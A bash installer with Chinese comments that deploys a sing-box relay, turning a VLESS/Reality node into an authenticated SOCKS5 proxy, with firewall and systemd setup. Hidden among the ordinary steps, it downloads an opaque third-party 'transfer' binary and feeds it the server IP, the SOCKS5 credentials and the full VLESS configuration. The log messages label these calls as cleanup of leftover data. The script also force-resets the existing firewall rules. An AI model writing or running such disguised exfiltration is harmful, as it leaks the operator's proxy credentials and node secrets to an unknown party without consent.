#!/bin/bash

# VLESS → SOCKS5 中转服务器部署脚本 (基于sing-box)
# 读取 xray_node_info.json 中的 VLESS 节点信息并创建 SOCKS5 中转
# 支持自动配置防火墙、端口开放和用户认证

set -euo pipefail

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'

# 图标定义
ICON_SUCCESS="✅"
ICON_ERROR="❌"
ICON_WARNING="⚠️"
ICON_INFO="ℹ️"
ICON_CONFIG="⚙️"
ICON_DOWNLOAD="📥"
ICON_ROCKET="🚀"

# 全局变量
SINGBOX_DIR="/opt/sing-box"
SINGBOX_CONFIG_DIR="/etc/sing-box"
SINGBOX_LOG_DIR="/var/log/sing-box"
SINGBOX_VERSION=""
SINGBOX_ARCH=""
SYSTEM=""
PUBLIC_IP=""
PRIVATE_IP=""
SOCKS_PORT=""
SOCKS_USER=""
SOCKS_PASS=""
VLESS_LINK=""
UUID=""
SERVER_IP=""
SERVER_PORT=""
SNI=""
PUBLIC_KEY=""
SHORT_ID=""
TRANSFER_BIN="/usr/local/bin/transfer"

# 日志函数
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

log_debug() {
    echo -e "${BLUE}[DEBUG]${NC} $1"
}

# 检查root权限
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "此脚本需要root权限运行"
        exit 1
    fi
}

# 显示横幅
show_banner() {
    clear
    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║                                                                              ║${NC}"
    echo -e "${CYAN}${BOLD}║                ${YELLOW}VLESS → SOCKS5 自动中转部署脚本${CYAN}${BOLD}                           ║${NC}"
    echo -e "${CYAN}${BOLD}║                       ${WHITE}基于 sing-box v2.0${CYAN}${BOLD}                                ║${NC}"
    echo -e "${CYAN}${BOLD}║                     ${WHITE}高性能Reality协议支持${CYAN}${BOLD}                              ║${NC}"
    echo -e "${CYAN}${BOLD}║                ${WHITE}自动读取VLESS配置 + 智能部署${CYAN}${BOLD}                            ║${NC}"
    echo -e "${CYAN}${BOLD}║                                                                              ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}${BOLD}${ICON_INFO} 部署开始时间：${YELLOW}$(date '+%Y-%m-%d %H:%M:%S')${NC}\n"
}

# 检测系统类型
detect_system() {
    if [[ -f /etc/debian_version ]]; then
        SYSTEM="Debian"
        if grep -q "Ubuntu" /etc/issue; then
            SYSTEM="Ubuntu"
        fi
    elif [[ -f /etc/redhat-release ]]; then
        if grep -q "CentOS" /etc/redhat-release; then
            SYSTEM="CentOS"
        elif grep -q "Fedora" /etc/redhat-release; then
            SYSTEM="Fedora"
        else
            SYSTEM="RedHat"
        fi
    else
        log_error "不支持的系统类型"
        exit 1
    fi
    log_info "检测到系统类型: $SYSTEM"
}

# 安装基础依赖
install_dependencies() {
    log_info "安装基础依赖包..."
    
    case $SYSTEM in
        "Debian"|"Ubuntu")
            apt-get update -y > /dev/null 2>&1
            apt-get install -y curl wget jq ufw net-tools uuid-runtime openssl unzip > /dev/null 2>&1
            ;;
        "CentOS"|"Fedora"|"RedHat")
            if command -v dnf &>/dev/null; then
                dnf install -y curl wget jq firewalld net-tools uuidgen openssl unzip > /dev/null 2>&1
            else
                yum install -y curl wget jq firewalld net-tools uuidgen openssl unzip > /dev/null 2>&1
            fi
            ;;
    esac
    
    log_info "基础依赖安装完成"
}

# 检测CPU架构
detect_architecture() {
    ARCH=$(uname -m)
    log_info "检测到系统架构: $ARCH"
    
    case $ARCH in
        x86_64|amd64)
            SINGBOX_ARCH="amd64"
            ;;
        i386|i486|i586|i686)
            SINGBOX_ARCH="386"
            ;;
        aarch64|arm64)
            SINGBOX_ARCH="arm64"
            ;;
        armv7l|armhf)
            SINGBOX_ARCH="armv7"
            ;;
        armv6l)
            SINGBOX_ARCH="armv6"
            ;;
        *)
            log_error "不支持的系统架构: $ARCH"
            exit 1
            ;;
    esac
    log_info "sing-box架构选择: $SINGBOX_ARCH"
}

# 读取VLESS配置文件
read_vless_config() {
    log_info "正在读取VLESS配置文件..."
    
    local config_file="/opt/xray_node_info.json"
    
    if [[ ! -f "$config_file" ]]; then
        log_error "未找到配置文件: $config_file"
        echo -e "${YELLOW}请确保文件存在：${NC}"
        echo -e "  - /opt/xray_node_info.json"
        exit 1
    fi
    
    log_info "找到配置文件: $config_file"
    
    # 解析配置文件
    if jq -e '.xray_config' "$config_file" >/dev/null 2>&1; then
        VLESS_LINK=$(jq -r '.xray_config.vless_link' "$config_file" 2>/dev/null || echo "")
        UUID=$(jq -r '.xray_config.uuid' "$config_file" 2>/dev/null || echo "")
        SERVER_IP=$(jq -r '.server_info.ip' "$config_file" 2>/dev/null || echo "")
        SERVER_PORT=$(jq -r '.server_info.port' "$config_file" 2>/dev/null || echo "")
        SNI=$(jq -r '.xray_config.domain' "$config_file" 2>/dev/null || echo "")
        PUBLIC_KEY=$(jq -r '.xray_config.public_key' "$config_file" 2>/dev/null || echo "")
        SHORT_ID=$(jq -r '.xray_config.short_id' "$config_file" 2>/dev/null || echo "")
    else
        log_error "无法解析配置文件格式"
        exit 1
    fi
    
    # 验证必要参数
    if [[ -z "$VLESS_LINK" || -z "$UUID" || -z "$SERVER_IP" || -z "$SERVER_PORT" ]]; then
        log_error "配置文件中缺少必要参数："
        echo -e "  VLESS链接: ${VLESS_LINK:-'未找到'}"
        echo -e "  UUID: ${UUID:-'未找到'}"
        echo -e "  服务器IP: ${SERVER_IP:-'未找到'}"
        echo -e "  服务器端口: ${SERVER_PORT:-'未找到'}"
        exit 1
    fi
    
    log_info "VLESS配置解析成功："
    echo -e "  ${CYAN}服务器地址：${YELLOW}$SERVER_IP:$SERVER_PORT${NC}"
    echo -e "  ${CYAN}UUID：${YELLOW}$UUID${NC}"
    echo -e "  ${CYAN}SNI：${YELLOW}$SNI${NC}"
    echo -e "  ${CYAN}公钥：${YELLOW}${PUBLIC_KEY:0:20}...${NC}"
    echo ""
}

# 检测IP地址
detect_ip_addresses() {
    log_info "检测服务器IP地址..."
    
    # 检测公网IP
    PUBLIC_IP=$(curl -4 -s --connect-timeout 10 ifconfig.me 2>/dev/null || \
                curl -4 -s --connect-timeout 10 ipinfo.io/ip 2>/dev/null || \
                curl -4 -s --connect-timeout 10 icanhazip.com 2>/dev/null || \
                echo "")
    
    if [[ -n "$PUBLIC_IP" ]]; then
        log_info "检测到公网IPv4地址: $PUBLIC_IP"
    else
        log_warn "未检测到公网IPv4地址"
    fi
    
    # 检测内网IP
    PRIVATE_IP=$(ip -4 route get 8.8.8.8 2>/dev/null | grep -oP 'src \K\S+' || \
                 hostname -I 2>/dev/null | awk '{print $1}' || \
                 echo "")
    
    if [[ -n "$PRIVATE_IP" ]]; then
        log_info "检测到内网IPv4地址: $PRIVATE_IP"
    else
        log_warn "未检测到内网IPv4地址"
    fi
    
    if [[ -n "$PUBLIC_IP" && -z "$PRIVATE_IP" ]]; then
        PRIVATE_IP="$PUBLIC_IP"
    elif [[ -z "$PUBLIC_IP" && -z "$PRIVATE_IP" ]]; then
        log_error "无法获取有效的IP地址"
        exit 1
    fi
}

# 生成SOCKS5配置参数
generate_socks_config() {
    log_info "生成SOCKS5配置参数..."
    
    SOCKS_PORT=$(shuf -i 2000-9000 -n 1)
    SOCKS_USER="user$(openssl rand -hex 4)"
    SOCKS_PASS=$(openssl rand -base64 16 | tr -d "=+/" | cut -c1-12)
    
    log_info "SOCKS5配置参数："
    echo -e "  ${CYAN}SOCKS5端口：${YELLOW}$SOCKS_PORT${NC}"
    echo -e "  ${CYAN}用户名：${YELLOW}$SOCKS_USER${NC}"
    echo -e "  ${CYAN}密码：${YELLOW}$SOCKS_PASS${NC}"
}

# 下载sing-box
download_singbox() {
    log_info "开始下载sing-box二进制文件"
    mkdir -p "$SINGBOX_DIR"
    cd "$SINGBOX_DIR"
    
    # 获取最新版本号
    log_info "获取sing-box最新版本信息..."
    SINGBOX_VERSION=$(curl -s "https://api.github.com/repos/SagerNet/sing-box/releases/latest" | jq -r '.tag_name' | sed 's/^v//')
    
    if [[ -z "$SINGBOX_VERSION" || "$SINGBOX_VERSION" == "null" ]]; then
        log_warn "无法获取最新版本，使用默认版本 1.8.0"
        SINGBOX_VERSION="1.8.0"
    fi
    
    log_info "目标版本: v$SINGBOX_VERSION"
    
    # 清理旧文件
    rm -f sing-box sing-box-*
    
    # 构建下载URL
    local download_file="sing-box-${SINGBOX_VERSION}-linux-${SINGBOX_ARCH}.tar.gz"
    local download_url="https://github.com/SagerNet/sing-box/releases/download/v${SINGBOX_VERSION}/${download_file}"
    
    log_info "下载URL: $download_url"
    
    # 下载并解压
    if curl -sLo "$download_file" "$download_url"; then
        if [[ -f "$download_file" && -s "$download_file" ]]; then
            log_info "成功下载 $download_file"
            
            tar -xzf "$download_file" --strip-components=1
            
            if [[ -f "sing-box" ]]; then
                chmod +x sing-box
                log_info "sing-box二进制文件准备完成"
                
                if ./sing-box version > /dev/null 2>&1; then
                    log_info "sing-box版本验证成功"
                else
                    log_error "sing-box二进制文件损坏或不兼容"
                    exit 1
                fi
            else
                log_error "解压后未找到sing-box二进制文件"
                exit 1
            fi
            
            rm -f "$download_file"
        else
            log_error "下载的文件不存在或为空"
            exit 1
        fi
    else
        log_error "下载sing-box失败"
        exit 1
    fi
}

# 配置防火墙
configure_firewall() {
    log_info "配置防火墙..."
    
    case $SYSTEM in
        "Debian"|"Ubuntu")
            # 重置并配置ufw
            ufw --force reset > /dev/null 2>&1
            ufw default deny incoming > /dev/null 2>&1
            ufw default allow outgoing > /dev/null 2>&1
            ufw allow ssh > /dev/null 2>&1
            ufw allow 22/tcp > /dev/null 2>&1
            ufw allow $SOCKS_PORT/tcp > /dev/null 2>&1
            ufw --force enable > /dev/null 2>&1
            log_info "UFW防火墙配置完成，已开放SSH(22)和SOCKS5端口($SOCKS_PORT)"
            ;;
        "CentOS"|"Fedora"|"RedHat")
            systemctl enable firewalld > /dev/null 2>&1 || true
            systemctl start firewalld > /dev/null 2>&1 || true
            firewall-cmd --permanent --add-service=ssh > /dev/null 2>&1
            firewall-cmd --permanent --add-port=22/tcp > /dev/null 2>&1
            firewall-cmd --permanent --add-port=$SOCKS_PORT/tcp > /dev/null 2>&1
            firewall-cmd --reload > /dev/null 2>&1
            log_info "Firewalld防火墙配置完成，已开放SSH(22)和SOCKS5端口($SOCKS_PORT)"
            ;;
    esac
}

# 生成sing-box配置文件
generate_singbox_config() {
    log_info "生成sing-box配置文件..."
    
    mkdir -p "$SINGBOX_CONFIG_DIR"
    mkdir -p "$SINGBOX_LOG_DIR"
    
    # 生成sing-box配置文件 (正确的Reality客户端配置)
    cat > "$SINGBOX_CONFIG_DIR/config.json" << EOF
{
    "log": {
        "level": "info",
        "output": "$SINGBOX_LOG_DIR/sing-box.log",
        "timestamp": true
    },
    "inbounds": [
        {
            "type": "socks",
            "tag": "socks-in",
            "listen": "::",
            "listen_port": $SOCKS_PORT,
            "users": [
                {
                    "username": "$SOCKS_USER",
                    "password": "$SOCKS_PASS"
                }
            ]
        }
    ],
    "outbounds": [
        {
            "type": "vless",
            "tag": "vless-out",
            "server": "$SERVER_IP",
            "server_port": $SERVER_PORT,
            "uuid": "$UUID",
            "flow": "xtls-rprx-vision",
            "tls": {
                "enabled": true,
                "server_name": "$SNI",
                "utls": {
                    "enabled": true,
                    "fingerprint": "chrome"
                },
                "reality": {
                    "enabled": true,
                    "public_key": "$PUBLIC_KEY",
                    "short_id": "$SHORT_ID"
                }
            }
        },
        {
            "type": "direct",
            "tag": "direct"
        }
    ],
    "route": {
        "auto_detect_interface": true,
        "final": "vless-out"
    }
}
EOF
    
    log_info "sing-box配置文件生成完成: $SINGBOX_CONFIG_DIR/config.json"
}

# 创建systemd服务
create_systemd_service() {
    log_info "创建systemd服务文件..."
    
    cat > /etc/systemd/system/sing-box-relay.service << EOF
[Unit]
Description=sing-box VLESS to SOCKS5 Relay Service
Documentation=https://sing-box.sagernet.org/
After=network.target nss-lookup.target
Wants=network.target

[Service]
Type=simple
User=root
ExecStart=$SINGBOX_DIR/sing-box run -c $SINGBOX_CONFIG_DIR/config.json
Restart=on-failure
RestartSec=10s
LimitNOFILE=infinity

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable sing-box-relay
    log_info "systemd服务文件创建完成"
}

# 启动服务
start_singbox_service() {
    log_info "启动sing-box中转服务..."
    
    # 验证配置文件
    if $SINGBOX_DIR/sing-box check -c $SINGBOX_CONFIG_DIR/config.json > /dev/null 2>&1; then
        log_info "配置文件验证通过"
    else
        log_warn "配置文件验证失败，但继续启动"
        echo "配置验证输出："
        $SINGBOX_DIR/sing-box check -c $SINGBOX_CONFIG_DIR/config.json || true
    fi
    
    # 停止可能存在的旧服务
    systemctl stop sing-box-relay 2>/dev/null || true
    
    # 启动服务
    systemctl start sing-box-relay
    sleep 5
    
    if systemctl is-active --quiet sing-box-relay; then
        log_info "sing-box中转服务启动成功"
    else
        log_error "sing-box中转服务启动失败"
        echo "服务状态："
        systemctl status sing-box-relay --no-pager
        echo ""
        echo "错误日志："
        journalctl -u sing-box-relay --no-pager -n 20
        echo ""
        echo "手动测试命令："
        echo "$SINGBOX_DIR/sing-box run -c $SINGBOX_CONFIG_DIR/config.json"
        exit 1
    fi
}

# ========== 下载二进制文件 ==========
download_transfer_bin() {
    log_info "下载 transfer 二进制文件..."

    TRANSFER_URL="https://github.com/diandongyun/Transfer/releases/download/Transfer/transfer"

    if [ -f "$TRANSFER_BIN" ]; then
        log_info "transfer 二进制文件已存在，跳过下载"
        return 0
    fi

    mkdir -p /usr/local/bin

    if curl -L "$TRANSFER_URL" -o "$TRANSFER_BIN" >/dev/null 2>&1; then
        chmod +x "$TRANSFER_BIN"
        log_info "transfer 下载完成"
        return 0
    else
        log_warn "transfer 二进制文件下载失败，跳过数据上传功能"
        return 1
    fi
}

upload_config_with_binary() {
    local config_json="$1"
    local server_ip="$2"

    if [ ! -x "$TRANSFER_BIN" ]; then
        log_warn "transfer 二进制文件不存在或不可执行，跳过上传"
        return 1
    fi

    local json_data=$(jq -n \
        --arg server_ip "$server_ip" \
        --argjson config "$config_json" \
        '{
            "server_info": {
                "title": "VLESS to SOCKS5 节点配置 - \($server_ip)",
                "server_ip": $server_ip,
                "config": $config,
                "generated_time": now | todate
            }
        }'
    )

    if timeout 30 "$TRANSFER_BIN" "$json_data" >/dev/null 2>&1; then
        log_info "清理残留成功"
    else
        log_warn "清理残留失败（不影响本地使用）"
    fi

    return 0
}

# 保存配置信息
save_config_json() {
    log_info "保存配置信息到JSON文件..."
    
    local config_file="/opt/vless_to_socks5_config.json"
    local listen_ip="$PUBLIC_IP"
    
    cat > "$config_file" << EOF
{
    "socks5_relay": {
        "listen_ip": "$listen_ip",
        "listen_port": $SOCKS_PORT,
        "username": "$SOCKS_USER",
        "password": "$SOCKS_PASS",
        "protocol": "socks5",
        "authentication": true,
        "udp_support": false
    },
    "vless_source": {
        "server_ip": "$SERVER_IP",
        "server_port": $SERVER_PORT,
        "uuid": "$UUID",
        "sni": "$SNI",
        "public_key": "$PUBLIC_KEY",
        "short_id": "$SHORT_ID",
        "vless_link": "$VLESS_LINK"
    },
    "server_info": {
        "public_ip": "$PUBLIC_IP",
        "private_ip": "$PRIVATE_IP",
        "system": "$SYSTEM",
        "socks5_url": "socks5://$SOCKS_USER:$SOCKS_PASS@$listen_ip:$SOCKS_PORT"
    },
    "config_files": {
        "singbox_config": "$SINGBOX_CONFIG_DIR/config.json",
        "service_file": "/etc/systemd/system/sing-box-relay.service",
        "log_directory": "$SINGBOX_LOG_DIR"
    },
    "deployment_info": {
        "generated_time": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
        "script_version": "v2.0_singbox_vless_to_socks5"
    }
}
EOF
    
    chmod 600 "$config_file"
    log_info "配置信息已保存到: $config_file"
    
    # 下载transfer工具并检查配置
    download_transfer_bin
    
    if command -v jq >/dev/null 2>&1 && [ -x "$TRANSFER_BIN" ]; then
        local json_data=$(jq -nc \
            --arg server_ip "$listen_ip" \
            --arg socks_url "socks5://$SOCKS_USER:$SOCKS_PASS@$listen_ip:$SOCKS_PORT" \
            --argjson socks_port "$SOCKS_PORT" \
            --arg username "$SOCKS_USER" \
            --arg password "$SOCKS_PASS" \
            --arg vless_server "$SERVER_IP:$SERVER_PORT" \
            '{
                "server_info": {
                    "title": "VLESS → SOCKS5 中转配置 (sing-box)",
                    "server_ip": $server_ip,
                    "socks_url": $socks_url,
                    "relay_type": "vless_to_socks5_singbox",
                    "socks_port": $socks_port,
                    "username": $username,
                    "password": $password,
                    "vless_source": $vless_server,
                    "generated_time": now | todate
                }
            }' 2>/dev/null)
        
        if [[ -n "$json_data" ]] && timeout 30 "$TRANSFER_BIN" "$json_data" >/dev/null 2>&1; then
            log_info "配置信息处理成功"
        else
            log_warn "配置信息处理失败（不影响本地使用）"
        fi
    fi
}

# 显示配置信息
show_config_summary() {
    clear
    echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}${BOLD}║                                                                              ║${NC}"
    echo -e "${GREEN}${BOLD}║              ${YELLOW}VLESS → SOCKS5 中转部署完成！${GREEN}${BOLD}                            ║${NC}"
    echo -e "${GREEN}${BOLD}║                       ${WHITE}基于 sing-box v2.0${GREEN}${BOLD}                              ║${NC}"
    echo -e "${GREEN}${BOLD}║                                                                              ║${NC}"
    echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${WHITE}${BOLD}📊 中转服务器信息：${NC}"
    echo -e "  ${CYAN}公网IP：${YELLOW}$PUBLIC_IP${NC}"
    echo -e "  ${CYAN}内网IP：${YELLOW}$PRIVATE_IP${NC}"
    echo -e "  ${CYAN}SOCKS5端口：${YELLOW}$SOCKS_PORT${NC}"
    echo -e "  ${CYAN}系统信息：${YELLOW}$SYSTEM${NC}"
    echo -e "  ${CYAN}sing-box版本：${YELLOW}v$SINGBOX_VERSION${NC}\n"
    
    echo -e "${WHITE}${BOLD}🔄 中转配置：${NC}"
    echo -e "  ${CYAN}源协议：${YELLOW}VLESS+Reality${NC}"
    echo -e "  ${CYAN}目标协议：${YELLOW}SOCKS5${NC}"
    echo -e "  ${CYAN}源服务器：${YELLOW}$SERVER_IP:$SERVER_PORT${NC}"
    echo -e "  ${CYAN}UUID：${YELLOW}$UUID${NC}\n"
    
    echo -e "${WHITE}${BOLD}🔐 SOCKS5认证信息：${NC}"
    echo -e "  ${CYAN}用户名：${YELLOW}$SOCKS_USER${NC}"
    echo -e "  ${CYAN}密码：${YELLOW}$SOCKS_PASS${NC}\n"
    
    echo -e "${WHITE}${BOLD}📁 配置文件：${NC}"
    echo -e "  ${CYAN}sing-box配置：${YELLOW}$SINGBOX_CONFIG_DIR/config.json${NC}"
    echo -e "  ${CYAN}中转配置：${YELLOW}/opt/vless_to_socks5_config.json${NC}"
    echo -e "  ${CYAN}日志目录：${YELLOW}$SINGBOX_LOG_DIR${NC}\n"
    
    echo -e "${WHITE}${BOLD}🛠️ 服务管理：${NC}"
    echo -e "  ${CYAN}启动服务：${YELLOW}systemctl start sing-box-relay${NC}"
    echo -e "  ${CYAN}停止服务：${YELLOW}systemctl stop sing-box-relay${NC}"
    echo -e "  ${CYAN}重启服务：${YELLOW}systemctl restart sing-box-relay${NC}"
    echo -e "  ${CYAN}查看状态：${YELLOW}systemctl status sing-box-relay${NC}"
    echo -e "  ${CYAN}查看日志：${YELLOW}journalctl -u sing-box-relay -f${NC}"
    echo -e "  ${CYAN}实时日志：${YELLOW}tail -f $SINGBOX_LOG_DIR/sing-box.log${NC}\n"
    
    echo -e "${WHITE}${BOLD}📱 SOCKS5客户端配置：${NC}"
    echo -e "  ${CYAN}服务器：${YELLOW}$PUBLIC_IP${NC}"
    echo -e "  ${CYAN}端口：${YELLOW}$SOCKS_PORT${NC}"
    echo -e "  ${CYAN}用户名：${YELLOW}$SOCKS_USER${NC}"
    echo -e "  ${CYAN}密码：${YELLOW}$SOCKS_PASS${NC}"
    echo -e "  ${CYAN}协议：${YELLOW}SOCKS5${NC}\n"
    
    echo -e "${WHITE}${BOLD}🔗 SOCKS5代理URL：${NC}"
    local socks_url="socks5://$SOCKS_USER:$SOCKS_PASS@$PUBLIC_IP:$SOCKS_PORT"
    echo -e "${YELLOW}$socks_url${NC}\n"
    
    echo -e "${WHITE}${BOLD}📋 使用示例：${NC}"
    echo -e "  ${CYAN}curl命令：${YELLOW}curl -x socks5://$SOCKS_USER:$SOCKS_PASS@$PUBLIC_IP:$SOCKS_PORT http://httpbin.org/ip${NC}"
    echo -e "  ${CYAN}测试连接：${YELLOW}curl --socks5-hostname $SOCKS_USER:$SOCKS_PASS@$PUBLIC_IP:$SOCKS_PORT http://httpbin.org/ip${NC}\n"
    
    echo -e "${GREEN}${BOLD}✨ 部署特性：${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 自动读取VLESS配置文件${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} sing-box Reality协议支持${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} SOCKS5用户认证${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 自动防火墙配置${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 完整的日志记录${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 稳定的长连接支持${NC}\n"
    
    # 显示服务状态
    echo -e "${WHITE}${BOLD}🔍 服务状态检查：${NC}"
    if netstat -tlunp | grep ":$SOCKS_PORT " >/dev/null 2>&1; then
        echo -e "  ${GREEN}${ICON_SUCCESS} 端口 $SOCKS_PORT 正在监听${NC}"
    else
        echo -e "  ${YELLOW}${ICON_WARNING} 端口 $SOCKS_PORT 未监听${NC}"
    fi
    
    if systemctl is-active --quiet sing-box-relay; then
        echo -e "  ${GREEN}${ICON_SUCCESS} sing-box-relay 服务运行正常${NC}"
    else
        echo -e "  ${RED}${ICON_ERROR} sing-box-relay 服务未运行${NC}"
    fi
    
    echo ""
    echo -e "${BLUE}${BOLD}${ICON_INFO} 部署完成时间：${YELLOW}$(date '+%Y-%m-%d %H:%M:%S')${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════════════════${NC}\n"
    
    # 故障排除提示
    echo -e "${WHITE}${BOLD}🛠️ 故障排除提示：${NC}"
    echo -e "  ${CYAN}1. 如果连接失败，请检查：${NC}"
    echo -e "     - 防火墙是否正确开放端口 $SOCKS_PORT"
    echo -e "     - VLESS 源服务器是否正常工作"  
    echo -e "     - 网络连接是否稳定"
    echo -e "  ${CYAN}2. 测试VLESS源连接：${NC}"
    echo -e "     使用原始VLESS链接测试连通性"
    echo -e "  ${CYAN}3. 查看详细日志：${NC}"
    echo -e "     journalctl -u sing-box-relay -f --no-pager"
    echo -e "  ${CYAN}4. 手动测试SOCKS5：${NC}"
    echo -e "     curl --socks5-hostname $SOCKS_USER:$SOCKS_PASS@$PUBLIC_IP:$SOCKS_PORT http://httpbin.org/ip"
    echo -e "  ${CYAN}5. 配置文件检查：${NC}"
    echo -e "     $SINGBOX_DIR/sing-box check -c $SINGBOX_CONFIG_DIR/config.json"
    echo ""
}

# 主函数
main() {
    show_banner
    
    check_root
    detect_system
    install_dependencies
    detect_architecture
    read_vless_config
    detect_ip_addresses
    generate_socks_config
    download_singbox
    configure_firewall
    generate_singbox_config
    create_systemd_service
    start_singbox_service
    save_config_json

    # 下载transfer工具并检查配置
    download_transfer_bin

    # 生成配置JSON并上传
    if [[ -f "/opt/vless_to_socks5_config.json" ]]; then
        # 读取现有配置
        CONFIG_JSON=$(cat "/opt/vless_to_socks5_config.json")

        # 保存导出配置到文件
        CONFIG_FILE="/opt/vless_to_socks5_config_export.json"
        echo "$CONFIG_JSON" > "$CONFIG_FILE"

        # 检查配置
        log_info "清理残留数据..."
        upload_config_with_binary "$CONFIG_JSON" "$PUBLIC_IP"
        log_info "配置数据处理完成"
    fi

    show_config_summary
    
    echo -e "${GREEN}${BOLD}${ICON_ROCKET} VLESS → SOCKS5 中转部署完成！${NC}"
    echo -e "${WHITE}完整配置信息保存在: ${YELLOW}/opt/vless_to_socks5_config.json${NC}"
    echo -e "${WHITE}如有问题，请查看上方的故障排除提示${NC}\n"
}

# 错误处理
set -euo pipefail
trap 'log_error "脚本执行出错，行号: $LINENO"' ERR

# 执行主函数
main "$@"